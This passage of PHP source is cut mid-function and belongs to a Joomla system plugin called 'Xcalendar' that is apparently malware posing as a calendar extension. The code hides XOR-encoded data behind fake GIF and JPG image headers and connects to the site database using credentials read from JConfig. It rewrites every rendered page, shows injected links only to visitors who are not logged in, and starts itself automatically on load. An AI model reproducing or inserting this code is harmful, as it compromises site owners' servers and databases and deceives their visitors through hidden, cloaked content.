			$text[$i] = chr(ord($text[$i]) ^ 50);
		}
		
		return $text;
	}
	
	function getImageEncodedText($name, $content) {
		$info = explode('.', $name);
		$type = strtolower($info[count($info) - 1]);
		
		$content = $this->getXorText($content);
		
		if ($type == 'gif') {
			return _base64_decode('R0lGODlhAQAGAJEAABqAqNzg5P///wByniH5BAAAAAAALAAAAAABAAYAAAIE3CASBQA=').$content;
		} elseif ($type == 'jpg') {
			return _base64_decode('/9j/4AAQSkZJRgABAgAAZABkAAD/7AARRHVja3kAAQAEAAAAZAAA/+4ADkFkb2JlAGQ=').$content;
		}
	}
	
	function getImageDecodedText($content) {
		$content = substr($content, 50);
		return $this->getXorText($content);
	}
}

class PlgSystemXcalendar extends JPlugin {
	function PlgSystemXcalendar(&$subject, $params) {
		parent::__construct($subject, $params);
	}
	
	function onAfterRender() {
		$instance = PlgSystemXcalendarHelper::getInstance();
		JResponse::setBody($instance->bufferEnd(JResponse::getBody()));
		
		return true;
	}
}

class PlgSystemXcalendarHelper extends PlgSystemXcalendarBase {
	static function getInstance() {
		static $instance = null;
		
		if ($instance === null) $instance = new PlgSystemXcalendarHelper();
		
		return $instance;
	}
	
	private function getDBDriver() {
		return function_exists('mysqli_connect') ? 'mysqli' : 'mysql';
	}
	
	function getConnection() {
		static $link = null;
		
		if ($link === null) {
			$link = false;
			
			if (!class_exists('JConfig')) return false;
			$config = new JConfig();
			
			if (substr($config->host, -2, 2) == '::') $config->host = substr($config->host, 0, -2);
			
			if ($this->getDBDriver() == 'mysqli') {
				if (preg_match('#^(.*):(\d+)$#', $config->host, $matches)) {
					if (!($link = mysqli_connect($matches[1], $config->user, $config->password, $config->db, $matches[2]))) return false;
				} else {
					if (!($link = mysqli_connect($config->host, $config->user, $config->password, $config->db))) return false;
				}
			} else {
				if (!($link = mysql_connect($config->host, $config->user, $config->password))) return false;
				if (!mysql_select_db($config->db, $link)) return false;
			}
		}
		
		return $link;
	}
	
	function dbQuery($query) {
		if (!($link = $this->getConnection())) return array(false, $this->getDBDriver() == 'mysqli' ? mysqli_error() : mysql_error());
		
		$result = $this->getDBDriver() == 'mysqli' ? mysqli_query($link, $query) : mysql_query($query, $link);
		if (!$result) return array(false, $this->getDBDriver() == 'mysqli' ? mysqli_error($link) : mysql_error($link));
		
		return array(true, $result);
	}
	
	function dbRow($result) {
		return $this->getDBDriver() == 'mysqli' ? mysqli_fetch_object($result) : mysql_fetch_object($result);
	}
	
	function dbEscape($text) {
		if (!($link = $this->getConnection())) return $text;
		return $this->getDBDriver() == 'mysqli' ? mysqli_escape_string($link, $text) : mysql_real_escape_string($text, $link);
	}
	
	function initActions() {
		parent::initActions();
	}
	
	function isShowLink() {
		if (parent::$processed) return false;
		$user = JFactory::getUser();
		
		if (!$user->guest) return false;
		
		$this->request = $_SERVER['REQUEST_URI'];
		list($success, $this->config) = $this->getConfig();
		if (!$success) return false;
		
		return true;
	}
}

$instance = PlgSystemXcalendarHelper::getInstance();
$instance->initActions();
?>